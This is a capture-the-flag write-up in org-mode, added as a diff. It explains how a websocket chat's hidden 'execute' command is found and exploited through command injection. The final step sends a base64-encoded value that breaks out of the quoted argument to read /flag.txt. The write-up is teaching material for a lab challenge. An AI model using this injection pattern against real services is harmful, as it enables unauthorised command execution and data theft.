@@ -1,0 +1,132 @@
+#+TITLE: Advent of CTF - Challenge 23
+#+SUBTITLE: "IRC"
+
+* Challenge
+
+This challenge centers on the =websocket= technology. It is commonly used in chat systems and often requires that a programmer implements their own security.
+
+What you will learn:
+
+- How to identify websockets
+- How to send your own messages
+
+* Solution :ATTACH:
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/Projects/credmp.github.io/writeups/advent-of-ctf/challenge-23/index_att
+:END:
+
+The challenge starts in a very unusual state; a blank screen with a =send= button.
+
+#+CAPTION: Challenge start
+[[file:index_att/challenge-start.png]]
+
+You can send any type of textual message. In the DevTools, under network, there is an odd status response; =101=. This means that a protocol switch was done. This request is no longer talking =HTTP=, but something else.
+
+In the =Response= tab of the network entry the messages that are sent back and forth can be observed.
+
+#+CAPTION: WebSocket traffic
+[[file:index_att/chats.png]]
+
+In the page source code it is clear that =socket.io= is used. The javascript can not be directly used in the DevTools, but copying the relevant parts from the =index= page to the console allows you to play with it from a Javascript environment.
+
+While doing so you will notice this fragment. It shows that if the =msg= has a property called =code= it will do something different.
+
+#+CAPTION: Discovery of the "code" command
+#+begin_src javascript
+ if (msg.command === "code") {
+     $('#messages').append($('<li>').html("<pre>" + msg.message + "</pre>"));
+ } else {
+     $('#messages').append($('<li>').text(msg.message));
+ }
+#+end_src
+
+Taking the plan from before; copy the =socket= creationg and the =socket.on= to the Javascript console.
+
+#+CAPTION: Basic code for the Console
+#+begin_src javascript
+var socket = io();
+
+socket.on('chat message', function(msg){
+  console.log(msg.command);
+  if (msg.command === "code") {
+    $('#messages').append($('<li>').html("<pre>" + msg.message + "</pre>"));
+  } else {
+    $('#messages').append($('<li>').text(msg.message));
+  }
+  window.scrollTo(0, document.body.scrollHeight);
+});
+#+end_src
+
+The =socket.emit= can now be utilized to send messages to the chat application. This happens in a different request then the one of the first load, but due to our logic the output is still visible in the screen. 
+
+#+CAPTION: Sending message from the console
+#+begin_src javascript
+socket.emit('chat message', {message: "Hello from console"});
+#+end_src
+
+#+CAPTION: DevTools shows the messages
+[[file:index_att/own-messages.png]]
+
+As it became clear that there is a =command= property that can be set, lets add that to the message.
+
+#+CAPTION: Sending a message with a command
+#+begin_src javascript
+socket.emit('chat message', {command: "code", message: "Hello from console"});
+#+end_src
+
+It stands to reason that there are other =command= options as well, given the hint in the code. After a few attempts you will probably ask for =help=.
+
+#+CAPTION: Sending a message with a command
+#+begin_src javascript
+socket.emit('chat message', {command: "help", message: "Hello from console"});
+#+end_src
+
+The response is indeed very helpful; it lists the accepted command types.
+
+#+CAPTION: The help response
+#+begin_src text
+Allowed message types are: help, execute and empty
+#+end_src
+
+The =execute= type stands out, so lets give that a try. As a =message= payload anything can be used at this point.
+
+#+CAPTION: Attempting an execute
+#+begin_src javascript
+socket.emit('chat message', {command:"execute", message: "something"});
+#+end_src
+
+The result is somewhat surprising. It says that it encountered =Invalid Base64=.
+
+#+CAPTION: Execute response to "something"
+#+begin_src text
+Invalid BASE64
+#+end_src
+
+After a few experiments it is clear that the message needs to be a valid Base64 payload. In javascript this is done through =btoa()=.
+
+#+CAPTION: Attempting an execute
+#+begin_src javascript
+socket.emit('chat message', {command:"execute", message: btoa("something")});
+#+end_src
+
+The result gives a clear path to victory! A command is executed with the payload; =ls 'something'=. Obviously =something= does not exist, but it does provide a mechanism to get the flag.
+
+#+CAPTION: Execute response to btoa("something")
+#+begin_src text
+ERR: Error: Command failed: /bin/ls 'something'
+ls: something: No such file or directory
+#+end_src
+
+From here on in it becomes a standard command injection. From the tests it is clear the application does something like =ls 'USERINPUT'=. So the ='= has to be escaped and then a new command can be entered, that reuses the ='= at the end. 
+
+#+CAPTION: Exploiting the command injection
+#+begin_src javascript
+socket.emit('chat message', {command:"execute", message: btoa(".';cat '/flag.txt")});
+#+end_src
+
+After grabbing the points be sure to also grab the badge.
+
+[[./index_att/badge.png]]
+
+Go back to the [[../../../index.org][homepage]].
+
